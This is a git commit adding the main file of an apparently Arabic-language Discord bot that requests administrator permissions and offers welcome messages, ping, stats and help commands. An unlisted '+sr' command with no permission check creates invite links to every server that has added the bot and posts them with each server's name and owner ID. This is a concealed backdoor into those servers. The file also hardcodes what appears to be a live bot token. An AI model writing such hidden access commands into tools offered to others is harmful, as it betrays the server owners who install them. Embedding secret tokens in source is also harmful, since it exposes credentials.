ee7617795d87e48b792cf1563461a04d4dfb8539
dragonboyytd <42145713+dragonboyytd@users.noreply.github.com>
2018-09-10 18:37:07 +0200

    Add files via upload

---
+++ index.js
@@ -0,0 +1,215 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+
+client.on('ready', () => {
+  client.user.setGame(` By DT DragonBoy_YTD#1431 .`,'https://www.twitch.tv/v5bz');
+  console.log('---------------');
+  console.log('Dragon Bot')
+  console.log('---------------')
+});
+
+
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '+sr') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })  
+
+client.on('guildCreate', guild => {
+  var embed = new Discord.RichEmbed()
+  .setColor(0x5500ff)
+  .setDescription(`**شكراً لك لإضافه البوت الى سيرفرك**`)
+      guild.owner.send(embed)
+});
+
+client.on("message", message => {
+ if (message.content === "+invite") {
+  const embed = new Discord.RichEmbed()
+      .setColor("RANDOM")
+      .setFooter('© Premium Bot:heart: جميع الحقوق محفوظة 2017 لــبوت')
+      .addField('شكرا لك لاستخدامك ل دراجون بوت', `https://discordapp.com/api/oauth2/authorize?client_id=478893774949318666&permissions=8&scope=bot`)
+  message.author.send({embed});
+
+ }
+});
+
+
+
+client.on("message", message => {
+ if (message.content === "+support") {
+  const embed = new Discord.RichEmbed()
+      .setColor("RANDOM")
+      .setFooter('© Premium Bot:heart: جميع الحقوق محفوظة دراجون بوت')  
+      .addField('سيرفر الدعم الفني', `  https://discord.gg/SFY3F2g  `)
+  message.author.send({embed});
+
+ }
+});
+
+
+
+
+client.on('message', message => {
+     if (message.content === "+bot") {
+     let embed = new Discord.RichEmbed()
+  .setColor("RANDOM")
+  .addField("**Servers:**" , client.guilds.size)
+  .addField("**Users:**", client.users.size)
+  .addField("**channels:**", client.channels.size)
+  .setTimestamp()
+message.channel.sendEmbed(embed);
+    }
+});
+
+client.on('guildMemberAdd', member => {
+    let channel = member.guild.channels.find('name', 'welcome');
+    let memberavatar = member.user.avatarURL
+      if (!channel) return;
+    let embed = new Discord.RichEmbed()
+        .setColor('RANDOM')
+        .setThumbnail(memberavatar)
+        .addField(':running_shirt_with_sash: | name :  ',`${member}`)
+        .addField(':loudspeaker: | اطلق من دخل شخص جديد' , `اهلاً بك في السيرفر, ${member}`)
+        .addField(':		id: | user :', "**[" + `${member.id}` + "]**" )
+                .addField('➡| انت العضو رقم',`${member.guild.memberCount}`)
+               
+                  .addField("Name:",`<@` + `${member.id}` + `>`, true)
+                     
+                                     .addField(' الـسيرفر', `${member.guild.name}`,true)
+                                       
+     .setFooter(`${member.guild.name}`)
+        .setTimestamp()
+   
+      channel.sendEmbed(embed);
+    });
+    
+    client.on('guildMemberRemove', member => {
+        var embed = new Discord.RichEmbed()
+        .setAuthor(member.user.username, member.user.avatarURL)
+        .setThumbnail(member.user.avatarURL)
+        .setTitle(`لقد خرج صديق :( :raised_hand::skin-tone-1: :pensive:`)
+        .setDescription(`مع السلامة يحبي :raised_hand::skin-tone-1: :pensive: `)
+        .addField(':bust_in_silhouette:   تبقي',`**[ ${member.guild.memberCount} ]**`,true)
+        .setColor('RED')
+        .setFooter(`====شكرا للاستمتاع====`, ' https://cdn.discordapp.com/attachments/397818254439219217/399292026782351381/shy.png')
+    
+    var channel =member.guild.channels.find('name', 'welcome')
+    if (!channel) return;
+    channel.send({embed : embed});
+    })
+	
+client.on('message', message => {
+     if (message.content === "+bot") {
+     let embed = new Discord.RichEmbed()
+  .setColor("RANDOM")
+  .addField("**Servers:**" , client.guilds.size)
+  .addField("**Users:**", client.users.size)
+  .addField("**channels:**", client.channels.size)
+  .setTimestamp()
+message.channel.sendEmbed(embed);
+    }
+});	
+
+
+
+client.on("message", message => {
+ if (message.content === "+help") {
+  const embed = new Discord.RichEmbed()
+      .setColor("RANDOM")	
+      .setFooter('======================================================')
+      .setFooter('اوامر الاعضاء')
+      .addField('+invite', `لاضافة البوت الى سيرفرك`)	
+      .addField('+bot' , `لمعرفة البوت`)
+      .addField('+ping' , `لمعرفة سرعة اتصال البوت`)
+ 
+ 
+ 
+ message.author.send({embed});
+
+
+ }
+});
+	  
+	  
+	  
+client.on('message', message => {
+    if(!message.channel.guild) return;
+if (message.content.startsWith('+ping')) {
+if(!message.channel.guild) return;
+var msg = `${Date.now() - message.createdTimestamp}`
+var api = `${Math.round(client.ping)}`
+if (message.author.bot) return;
+let embed = new Discord.RichEmbed()
+.setAuthor(message.author.username,message.author.avatarURL)
+.setColor('RANDOM')
+.addField('**Time Taken:**',msg + " ms 📶 ")
+.addField('**WebSocket:**',api + " ms 📶 ")
+message.channel.send({embed:embed});
+}
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	  
+client.on('message', async message => {
+            if(!message.channel.guild) return;
+             if (message.content.startsWith("+sets")) {
+let args = message.content.split(' ').slice(1).join(' ');
+            let sigMessage = await args;
+            
+            if (sigMessage === "online") {
+                client.user.setStatus("online");
+                message.author.send("Your status was set to online.");
+            }
+            if (sigMessage === "idle") {
+                client.user.setStatus("idle");
+                message.author.send("Your status was set to idle.");
+            }
+            if (sigMessage === "invisible") {
+                client.user.setStatus("invisible");
+                message.author.send("Your status was set to invisible.");
+            }
+            if (sigMessage === "dnd") {
+                client.user.setStatus("dnd");
+                message.author.send("Your status was set to dnd.");
+            }
+            // message.author.send("." + message.content);
+        
+}
+});
+
+
+	
+client.login('NDc4ODkzNzc0OTQ5MzE4NjY2.DlRVGA.98Iz6aMnyLKshsBzQkT-qCgEYwc');
